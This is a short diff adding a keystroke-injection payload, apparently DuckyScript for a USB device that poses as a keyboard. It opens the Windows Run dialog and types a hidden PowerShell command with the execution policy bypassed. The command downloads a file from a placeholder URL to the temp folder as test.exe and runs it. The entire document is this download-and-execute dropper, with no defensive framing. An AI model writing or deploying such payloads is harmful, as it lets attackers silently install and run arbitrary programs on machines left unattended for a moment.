@@ -1,0 +1,5 @@
+REM download and run something hosted on a URL
+GUI r
+DELAY 200
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadFile('http://example.com/test.txt',\"$env:temp\test.exe\"); Start-Process \"$env:temp\test.exe\""
+ENTER
